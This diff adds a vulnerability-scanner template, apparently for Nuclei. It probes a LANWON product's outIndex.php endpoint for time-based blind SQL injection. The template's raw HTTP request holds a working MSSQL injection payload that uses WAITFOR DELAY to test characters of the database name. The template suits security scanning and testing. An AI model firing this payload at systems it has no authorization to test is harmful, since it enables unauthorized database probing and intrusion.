@@ -1,0 +1,30 @@
+id: LANWON-outIndex-sqli
+
+info:
+  name: LANWON-outIndex-sqli
+  author: Lemonlove7
+  severity: high
+  description: |
+    This template detects SQL Injection vulnerabilities based on time-delay responses.
+    It sends crafted payloads to observe if there are noticeable delays in the response time.
+  tags: sql, injection, time-based
+
+http:
+  - raw:
+      - |
+        GET /xds/outIndex.php?appuser=1&name=1%22%27;if%20(ascii(substring(db_name(),1,1)))=88%20WAITFOR%20DELAY%20%270:0:5%27--%20q HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
+      - type: status
+        status:
+          - 200
